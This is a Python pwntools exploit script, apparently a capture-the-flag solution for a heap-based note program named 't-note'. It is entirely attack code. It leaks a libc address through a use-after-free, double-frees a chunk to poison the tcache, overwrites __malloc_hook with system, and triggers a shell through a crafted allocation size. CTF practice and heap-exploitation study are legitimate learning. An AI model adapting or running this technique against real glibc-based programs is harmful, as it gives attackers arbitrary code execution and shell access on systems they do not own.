#!/usr/bin/env python

from pwn import *

# r = process( './t-note' )
libc = ELF( './libc.so' )

def add( size, note ):
    r.sendlineafter( '>', '1' )
    r.sendlineafter( 'Size:', str( size ) )
    r.sendlineafter( 'Note:', note )

def delete( index ):
    r.sendlineafter( '>', '3' )
    r.sendlineafter( 'Index:', str( index ) )

def show( index ):
    r.sendlineafter( '>', '2' )
    r.sendlineafter( 'Index:', str( index ) )

add( 0x1000, 'zzz' )
add( 0x40, 'bbb' )
delete( 0 )
show( 0 )
r.recvline()
leak = u64( r.recv(6) + '\x00\x00' )
libc.address = leak - 0x3ebca0
log.success( 'libc base: ' + hex( libc.address ) )

delete( 1 )
delete( 1 )

add( 0x40, p64( libc.symbols['__malloc_hook'] ) )
add( 0x40, 'a' )
add( 0x40, p64( libc.symbols['system'] ) )

bin_sh = libc.search('/bin/sh').next()
log.info( 'bin_sh : ' + hex(bin_sh) )
log.success( 'bin_sh origin: ' + str( bin_sh ) )

r.sendlineafter( '>', '1' )
r.sendlineafter( 'Size:', str( bin_sh ) )

r.interactive()
